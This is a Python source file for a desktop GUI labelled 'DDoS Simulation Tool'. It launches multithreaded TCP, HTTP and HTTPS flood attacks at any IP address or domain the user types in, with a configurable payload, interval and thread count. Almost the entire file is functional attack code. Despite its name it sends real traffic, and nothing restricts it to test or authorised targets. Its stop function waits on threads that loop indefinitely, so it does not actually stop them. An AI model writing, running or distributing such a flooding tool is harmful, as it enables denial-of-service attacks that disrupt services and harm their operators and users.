import tkinter as tk
from tkinter import messagebox
import socket
import threading
import time
import logging
import requests
import re
import asyncio
import aiohttp

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Global variable to manage threads
attack_threads = []

# Function to start the attack
def start_attack():
    try:
        # Retrieve and validate inputs
        target = target_entry.get().strip()
        port = port_entry.get().strip()
        attack_type = attack_type_var.get().strip()
        payload = payload_entry.get().strip()
        interval = interval_entry.get().strip()
        num_threads = num_threads_entry.get().strip()

        # Check for empty inputs
        if not all([target, port, attack_type, payload, interval, num_threads]):
            raise ValueError("All fields must be filled out.")

        # Validate port
        port = validate_port(port)

        # Validate interval
        interval = validate_positive_float(interval)

        # Validate number of threads
        num_threads = validate_positive_integer(num_threads)

        # Validate target (IP or domain)
        if not validate_ip(target) and not validate_domain(target):
            raise ValueError("Invalid IP address or domain format.")

        # Start attack based on type
        for _ in range(num_threads):
            if attack_type == 'TCP':
                thread = threading.Thread(target=send_tcp_flood, args=(target, port, payload.encode(), interval))
            elif attack_type == 'HTTP':
                thread = threading.Thread(target=asyncio.run, args=(send_async_http_flood(target, port, payload.encode(), interval),))
            elif attack_type == 'HTTPS':
                thread = threading.Thread(target=asyncio.run, args=(send_async_https_flood(target, port, payload.encode(), interval),))
            attack_threads.append(thread)
            thread.start()

        messagebox.showinfo("Success", "Attack started successfully!")

    except ValueError as ve:
        messagebox.showerror("Input Error", str(ve))
    except Exception as e:
        messagebox.showerror("Error", f"An unexpected error occurred: {e}")

def validate_ip(ip):
    ip_regex = re.compile(
        r'^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}'
        r'(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
    )
    return re.match(ip_regex, ip) is not None

def validate_domain(domain):
    domain_regex = re.compile(
        r'^(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$'
    )
    return re.match(domain_regex, domain) is not None

def validate_port(port):
    try:
        port = int(port)
        if port < 1 or port > 65535:
            raise ValueError("Port number must be between 1 and 65535.")
        return port
    except ValueError:
        raise ValueError("Port number must be an integer.")

def validate_positive_float(value):
    try:
        value = float(value)
        if value <= 0:
            raise ValueError("Value must be a positive number.")
        return value
    except ValueError:
        raise ValueError("Value must be a number.")

def validate_positive_integer(value):
    try:
        value = int(value)
        if value <= 0:
            raise ValueError("Value must be a positive integer.")
        return value
    except ValueError:
        raise ValueError("Value must be an integer.")

# Function to send TCP flood attack
def send_tcp_flood(target, port, payload, interval):
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((target, port))
                s.send(payload)
            time.sleep(interval)
        except Exception as e:
            logging.error(f"TCP Flood Error: {e}")
            break  # Exit the loop on error

# Asynchronous function to send HTTP flood attack
async def send_async_http_flood(target, port, payload, interval):
    url = f"http://{target}:{port}"
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                async with session.get(url, data=payload) as response:
                    logging.info(f"🌐 HTTP Flood Response: {response.status}")
            except Exception as e:
                logging.error(f"HTTP Flood Error: {e}")
                break  # Exit the loop on error
            await asyncio.sleep(interval)

# Asynchronous function to send HTTPS flood attack
async def send_async_https_flood(target, port, payload, interval):
    url = f"https://{target}:{port}"
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                async with session.get(url, data=payload) as response:
                    logging.info(f"🔒 HTTPS Flood Response: {response.status}")
            except Exception as e:
                logging.error(f"HTTPS Flood Error: {e}")
                break  # Exit the loop on error
            await asyncio.sleep(interval)

# Function to stop the attack
def stop_attack():
    global attack_threads
    for thread in attack_threads:
        if thread.is_alive():
            thread.join()  # Wait for the thread to complete
    attack_threads = []
    messagebox.showinfo("Stopped", "All attacks have been stopped.")

# GUI setup
root = tk.Tk()
root.title("DDoS Simulation Tool")

# Dark theme configuration
dark_bg = "#2E2E2E"
dark_fg = "#FFFFFF"

# Input fields
tk.Label(root, text="Target IP/Domain:", bg=dark_bg, fg=dark_fg).grid(row=0, column=0, sticky="e")
target_entry = tk.Entry(root)
target_entry.grid(row=0, column=1, columnspan=2, sticky="w")

tk.Label(root, text="Port:", bg=dark_bg, fg=dark_fg).grid(row=1, column=0, sticky="e")
port_entry = tk.Entry(root)
port_entry.grid(row=1, column=1, columnspan=2, sticky="w")

tk.Label(root, text="Attack Type:", bg=dark_bg, fg=dark_fg).grid(row=2, column=0, sticky="e")
attack_type_var = tk.StringVar()
tk.Radiobutton(root, text="TCP", variable=attack_type_var, value='TCP', bg=dark_bg, fg=dark_fg, selectcolor=dark_bg).grid(row=2, column=1)
tk.Radiobutton(root, text="HTTP", variable=attack_type_var, value='HTTP', bg=dark_bg, fg=dark_fg, selectcolor=dark_bg).grid(row=2, column=2)
tk.Radiobutton(root, text="HTTPS", variable=attack_type_var, value='HTTPS', bg=dark_bg, fg=dark_fg, selectcolor=dark_bg).grid(row=2, column=3)

tk.Label(root, text="Payload:", bg=dark_bg, fg=dark_fg).grid(row=3, column=0, sticky="e")
payload_entry = tk.Entry(root)
payload_entry.grid(row=3, column=1, columnspan=2, sticky="w")

tk.Label(root, text="Interval (seconds):", bg=dark_bg, fg=dark_fg).grid(row=4, column=0, sticky="e")
interval_entry = tk.Entry(root)
interval_entry.grid(row=4, column=1, columnspan=2, sticky="w")

tk.Label(root, text="Number of Threads:", bg=dark_bg, fg=dark_fg).grid(row=5, column=0, sticky="e")
num_threads_entry = tk.Entry(root)
num_threads_entry.grid(row=5, column=1, columnspan=2, sticky="w")

tk.Button(root, text="Start Attack 🚀", command=start_attack, bg="#4CAF50", fg=dark_fg).grid(row=6, column=0, columnspan=2, pady=10)
tk.Button(root, text="Stop Attack 🛑", command=stop_attack, bg="#F44336", fg=dark_fg).grid(row=6, column=2, columnspan=2, pady=10)

root.configure(bg=dark_bg)
root.mainloop()
